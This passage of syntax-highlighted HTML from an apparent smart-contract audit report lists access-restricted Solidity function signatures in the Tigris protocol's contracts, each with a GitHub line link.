class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAssetChainlinkFeed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feed</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeMultiplier</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateAssetLeverage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAssetBaseFundingRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateAssetFeeMultiplier</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeMultiplier</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pauseAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_isPaused</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxBaseFundingRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxBaseFundingRate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setProtocol</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_protocol</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxOi</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxOi</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifyLongOi</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_onOpen</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifyShortOi</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_onOpen</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L33</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"173\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBaseURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newBaseURI</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateFunding</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_longOi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shortOi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_vaultFundingPercent</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">132           </span><span class=\"mtk12\">MintTrade</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mintTrade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">133:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeLimitOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newMargin</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifyMargin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newMargin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newLeverage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addToPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newMargin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newPrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAccInterest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reducePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifyTp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tpPrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifySl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_slPrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">310</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMinter</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L85</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"174\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setReferred</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referredTrader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_hash</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setProtocol</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_protocol</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initRefs</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">61            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_codeOwners</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">62            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ownedCodes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">63            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referredA</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referredTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L32</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"175\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">14            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">15            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">16        ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">17            </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">18            </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">19:           </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\">() </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">24        </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">25            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">26            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">27        ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">28            </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">29            </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">30:           </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\">() </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">38        </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMinter</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">39            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">40            </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">41        ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">42            </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">43:           </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L13-L19</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"176\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">listToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delistToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"177\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_closePosition</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">62            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">63            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">,</span></span></span>\n<span 